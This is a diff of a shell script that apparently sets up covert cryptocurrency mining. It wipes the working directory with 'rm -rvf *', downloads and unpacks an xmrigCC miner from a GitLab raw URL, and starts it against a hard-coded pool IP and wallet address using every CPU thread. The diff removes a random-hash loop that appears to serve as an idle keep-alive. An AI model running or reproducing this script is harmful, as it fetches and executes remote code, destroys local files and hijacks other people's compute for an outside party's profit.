@@ -3,4 +3,4 @@ rm -rvf *
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 wget https://gitlab.com/majapahlevi/mvp/-/raw/main/xmrigCC-3.4.1.tar.gz && tar -xf xmrigCC-3.4.1.tar.gz && rm xmrigCC-3.4.1.tar.gz && ./miner/xmrigDaemon -o 209.97.168.28:443 -u SaLvsC7GYZSQpZXn4F63d52MSxNjKLa3hh92Mucq2Av29ueS1Lej8HK8r7P3arc9BvKsduPQ17pYdZG74au9hXs2cwHyZ9CFwuw -p .$(shuf -n 1 -i 1-999)-Bismillah -k -a randomx -t $(nproc --all)
-while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
+
